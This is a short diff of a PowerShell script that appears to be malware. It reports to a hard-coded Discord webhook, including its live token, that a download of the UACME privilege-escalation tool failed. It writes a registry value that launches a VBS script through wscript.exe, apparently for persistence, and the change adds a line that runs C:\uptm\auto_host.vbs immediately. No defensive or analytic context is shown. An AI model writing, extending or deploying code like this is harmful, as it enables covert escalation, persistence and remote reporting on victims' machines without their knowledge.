@@ -134,6 +134,8 @@ catch {
     Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1508834299049148597/34nknYuISCFwshV07VmY88rpk4fXD8pGfZPBZVGFyMax9ckOpjJC07z9mG6czsQAgoBA" -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes((@{embeds=@(@{title="無法下載UACME並以管理員啟動";footer=@{text="仍會以普通身分繼續操作"};color=16711680})} | ConvertTo-Json -Depth 5))) -ContentType "application/json; charset=utf-8"
 
     New-ItemProperty -Path $registryPath -Name $valueName -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force
+
+    wscript.exe "C:\uptm\auto_host.vbs"
 }
 
 # 12. Delete Temp File (改用 PowerShell 原生安全刪除)
